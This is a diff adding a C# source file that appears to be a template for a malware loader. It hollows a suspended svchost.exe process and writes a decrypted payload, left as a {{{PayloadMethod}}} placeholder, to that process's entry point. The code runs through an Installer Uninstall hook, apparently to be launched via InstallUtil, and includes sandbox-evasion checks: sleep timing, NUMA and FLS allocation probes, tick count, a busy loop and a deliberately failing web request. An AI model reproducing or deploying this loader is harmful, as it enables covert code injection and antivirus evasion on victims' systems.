@@ -1,0 +1,215 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Diagnostics;
+using System.Threading;
+using System.Security.Cryptography;
+using System.Net;
+using System.Management.Automation; //Import refrences from > C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
+using System.Configuration.Install; //Import System.Configuration.Install from References
+
+namespace StandardProcessHollowing
+{
+    class program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("First, discombobulate. Dazed, discombobulate. Distract target.. discombobulate.");
+        }
+    }
+    public class SimpleAES
+    {
+        private AesCryptoServiceProvider _aes;
+        private ICryptoTransform _crypto;
+
+        public SimpleAES(string KEY, string IV)
+        {
+            _aes = new AesCryptoServiceProvider();
+            _aes.BlockSize = 128;
+            _aes.KeySize = 128;
+            _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
+            _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
+            _aes.Padding = PaddingMode.PKCS7;
+            _aes.Mode = CipherMode.CBC;
+        }
+
+        public byte[] decrypt(string message)
+        {
+            _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
+            byte[] decrypted = _crypto.TransformFinalBlock(System.Convert.FromBase64String(message), 0, System.Convert.FromBase64String(message).Length);
+            _crypto.Dispose();
+            return decrypted;
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class sample : System.Configuration.Install.Installer
+    {
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr FlsAlloc(IntPtr callback);
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetTickCount();
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        //MAIN
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Console.WriteLine("[+] Validating Environment...");
+
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_Date Time: " + t2);
+
+            IntPtr VirtualAllocExNumaMem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+
+            if (VirtualAllocExNumaMem == null)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_VirtualAllocExNumaMem: " + VirtualAllocExNumaMem);
+
+            IntPtr FlsAllocMem = FlsAlloc(IntPtr.Zero);
+            if (FlsAllocMem == null)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_FlsAlloc: " + FlsAlloc(IntPtr.Zero));
+
+            if (GetTickCount() < 60000)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_GetTickCount: " + GetTickCount());
+
+            int manyrun = 0;
+            for (int z = 0; z < 100000000; z++)
+            {
+                manyrun++;
+            }
+            Console.WriteLine("\t|_LoopCheck: " + manyrun);
+            if (manyrun == 100000000)
+            {
+                try
+                {
+                    var fakeKey = new WebClient().DownloadString("http://ioashndoiasnddhaposdmawpidnaspidmwneionioasndoiasndpspodmadmasaadhjpoadelnbjkbnsa=asdasnmdpasjdpasdnfnpfnouahd/key.txt");
+                }
+                catch (Exception e)
+                {
+                    STARTUPINFO si = new STARTUPINFO();
+                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                    bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+                    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+                    PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+                    uint tmp = 0;
+                    IntPtr hProcess = pi.hProcess;
+                    ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+                    IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+                    byte[] addrBuf = new byte[IntPtr.Size];
+                    IntPtr nRead = IntPtr.Zero;
+                    ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+                    IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                    byte[] data = new byte[0x200];
+                    ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+                    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+                    uint opthdr = e_lfanew_offset + 0x28;
+                    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+                    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+                    DateTime t3 = DateTime.Now;
+                    Sleep(2000);
+                    double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
+                    if (t4 < 1.5)
+                    {
+                        Environment.Exit(0);
+                    }
+
+                    {{{PayloadMethod}}}
+
+                    WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+                    ResumeThread(pi.hThread);
+
+                    Console.WriteLine("Are you felling It now?");
+                    Environment.Exit(0);
+                }
+                Environment.Exit(0);
+            }
+            Environment.Exit(0);
+        }
+    }
+}
